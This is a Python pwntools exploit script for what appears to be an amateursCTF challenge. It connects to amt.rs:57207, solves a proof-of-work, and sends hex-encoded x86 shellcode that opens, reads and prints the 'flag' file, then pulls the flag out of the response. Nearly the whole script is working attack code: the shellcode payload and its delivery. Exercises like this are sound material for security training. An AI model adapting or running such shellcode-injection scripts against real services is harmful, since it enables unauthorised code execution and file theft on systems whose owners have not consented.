#!/usr/bin/env python3
from pwn import *
import base64
import re

def solve_pwn_red_pow(challenge):
    parts = challenge.split('.')
    difficulty = int.from_bytes(base64.b64decode(parts[1]), 'big')
    challenge_bytes = base64.b64decode(parts[2])

    mod = (1 << 1279) - 1
    exp = 1 << 1277
    x = int.from_bytes(challenge_bytes, 'big')

    for _ in range(difficulty):
        x = pow(x, exp, mod)
        x ^= 1

    solution_bytes = x.to_bytes((x.bit_length() + 7) // 8, 'big')
    return 's.' + base64.b64encode(solution_bytes).decode()

# VALIDATED SHELLCODE that reads and writes flag
payload = "b84170330180008d40800040b86970330180008d40800040b89170330180008d40800040b8a570330180008d4080004068666c616789e3b805000000b900000000ba00000000e9f1ffffff404089c3b80300000089e1ba64000000e90400000040484048404089c2b804000000bb01000000e915000000404840484048404840484048404840484048404840484040b801000000bb00000000e90200000040484040e9f9ffffff"

log.info("="*60)
log.info("CONNECTING TO amt.rs:57207")
log.info("="*60)
io = remote('amt.rs', 57207)

# Solve PoW
pow_data = io.recvuntil(b'solution: ').decode()
match = re.search(r's\.[A-Za-z0-9+/=]+\.[A-Za-z0-9+/=]+', pow_data)
if match:
    challenge = match.group(0)
    log.info(f"PoW Challenge: {challenge}")
    solution = solve_pwn_red_pow(challenge)
    io.sendline(solution.encode())
    log.success("PoW solved!")

# Send shellcode
io.recvuntil(b'shellcode: ')
log.info("Sending exploit shellcode...")
io.sendline(payload.encode())
log.success("Shellcode delivered!")

# Get the flag!
log.info("Receiving flag...")
try:
    output = io.recvall(timeout=10)

    print("\n" + "="*60)
    print("FLAG OUTPUT:")
    print("="*60)

    # The flag should be in the output
    decoded = output.decode(errors='ignore')
    print(decoded)

    # Extract flag if present
    import re
    flags = re.findall(r'amateursCTF\{[^}]+\}', decoded)
    if flags:
        print("\n" + "="*60)
        print("FLAG FOUND:")
        print("="*60)
        for flag in flags:
            print(f"  {flag}")
        print("="*60)

except Exception as e:
    log.error(f"Error: {e}")

io.close()
log.success("Done!")
